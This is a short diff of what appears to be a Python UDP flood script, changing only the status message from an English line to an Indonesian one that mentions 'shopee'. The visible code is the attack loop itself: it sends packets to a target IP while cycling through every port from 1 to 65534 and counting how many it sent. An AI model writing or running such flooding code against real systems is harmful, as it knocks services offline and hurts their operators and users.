@@ -51,6 +51,6 @@ while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print (R+"RevDleecs %s Sent Packet To %s throught port %s"%(sent,ip,port))
+     print (R+"Mengirim %s Paket dari shopee %s throught port %s"%(sent,ip,port))
      if port == 65534:
        port = 1
